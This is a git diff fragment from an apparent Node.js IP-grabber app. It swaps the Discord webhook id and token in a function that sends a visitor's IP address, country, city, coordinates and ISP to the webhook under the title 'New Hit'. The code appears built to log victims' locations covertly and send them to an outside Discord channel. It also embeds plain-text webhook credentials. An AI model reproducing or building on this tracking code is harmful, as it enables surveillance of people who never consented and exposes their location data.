@@ -27,9 +27,9 @@ app.get(`/ip`, async (req, res)=>{
 
 async function sendWH(ip, country, countryCode, city, lat, lon ,isp){
     const webhook = new WebhookClient({
-		id: '1090664218010845234',
+		id: '1095006207284101182',
 		token:
-			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
+			'sc8MMflFGR9l8e395kQvbDwva6YXTofvw-T_uyvveAVx-8D6cMQGx1S0_PBpCx98HyeN',
 	});
     const embed = new EmbedBuilder()
 		.setTitle(`**New Hit ❗**`)
